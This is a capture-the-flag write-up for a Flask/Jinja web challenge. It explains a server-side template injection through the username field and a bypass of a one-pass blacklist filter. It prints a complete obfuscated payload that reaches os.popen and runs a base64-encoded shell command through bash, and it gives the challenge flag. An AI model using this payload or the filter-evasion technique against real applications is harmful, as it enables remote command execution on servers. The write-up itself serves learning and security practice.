## Noteworthy
> **Category:** web  

### Challenge Overview
We were given a deployed instance of a web app, and its source code. Its a flask based app in python, and uses jinja templates. 

### Code Review
Codebase was pretty small. On first glace, everything seemed secured. There were a few instances of render_templates but we had no way of creating malicious templates. However, there was one render_template_string call that could be exploited.


### The vulnerability.
When a get request was sent to `/notes/<int:note_id>`, it checked if the requester is the author of the note. If not, it returned the name of the author with `render_template_string`. Now the author name was added unsafely before being passed into the jinja rendering function, which means we has SSTI if we control the author field. And the author field is nothing but the username!!

#### Approach
Now that we know we have SSTI, we had to bypass the sanitization function call. Every time a user registered, his username was stripped of blacklisted words. But the function ran only once in a linear fashion. 

Like `{os{ 7*7 }os}` would become `{{ 7*7 }}` as `os` is stripped from the string. We just had to focus on single character blacklist like `_` and `[]` etc.

I searched for how to use ascii codes to form strings and found this - 
`'%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,108,111,98,97,108,115,95,95)`. This payload returns to `__globals__`. That was the crux of payload. I chained attr() calls with strings formatted in ascii codes. This was the final payload - 

```
{os{request|attr('application')|attr('%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,108,111,98,97,108,115,95,95))|attr('%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,101,116,105,116,101,109,95,95))('%c%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,98,117,105,108,116,105,110,115,95,95))|attr('%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,101,116,105,116,101,109,95,95))('%c%c%c%c%c%c%c%c%c%c'|format(95,95,105,109,112,111,114,116,95,95))('%c%c'|format(111,115))|attr('popen')('echo Z2l0IGxvZyAtcCBmbGFn | babasese64 -d | bash')|attr('read')()}os}
```

(Do note that in the last bash command, we are checking the git history of the flag file since the flag was redacted in new commits).


Finally we have to use this payload during account registration, create a dummy note, and get the note ID. Then login using a different account and try accessing that note ID. This will execute the payload.

**Flag:** `saic{g1T_15_4_c00l_700l}`
